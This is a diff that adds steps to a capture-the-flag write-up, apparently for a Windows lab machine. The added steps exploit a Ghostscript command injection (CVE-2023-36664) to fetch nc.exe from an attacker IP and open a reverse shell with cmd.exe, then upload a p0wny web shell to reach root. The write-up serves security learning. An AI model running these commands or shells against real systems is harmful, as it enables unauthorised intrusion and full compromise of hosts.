@@ -67,11 +67,32 @@ Logging into the webmail server we saw, there is something about Ghostscript whi
 
 https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection
 
+Exploiting the vulnerability:
 
+``` python3 CVE_2023_36664_exploit.py --payload "wget 10.10.14.196/nc.exe -o nc.exe" -i --filename file.eps ```
+ - Note that we need a Windows executable nc since it is a Windows machine
 
+![image](https://github.com/michaelwang3668/ctf-writeups/assets/75542248/5e82ace8-c8b5-4374-b2a7-5e92a4956148)
+
+![image](https://github.com/michaelwang3668/ctf-writeups/assets/75542248/ff971cfb-7200-452f-93a1-8200795dfc1a)
+
+``` python3 CVE_2023_36664_exploit.py --payload "nc.exe 10.10.14.196 1234 -e cmd.exe" -i --filename file.eps ```
+
+Sending it to drbrown again:
+
+![image](https://github.com/michaelwang3668/ctf-writeups/assets/75542248/919837d4-503e-4ef9-9df7-875afcd251bc)
+
+## Privesc
+User privs:
+
+![image](https://github.com/michaelwang3668/ctf-writeups/assets/75542248/bb0af363-db94-4b0f-9131-64ae1e1298a4)
+
+Seems like the webserver on 443 is running as root, so we upload a p0wny shell and get root!
+
+![image](https://github.com/michaelwang3668/ctf-writeups/assets/75542248/aba2582a-76c5-4214-883a-b97e091a118b)
 
 
 ## What I Learned
-Folder perms != file perms, even if you can't access the directory, you may be able to access a file in the directory
-.phar extension
-Ghostscript CVE
+ - Folder perms != file perms, even if you can't access the directory, you may be able to access a file in the directory
+ - .phar extension substitute for .php extension
+ - Ghostscript Command Injection CVE
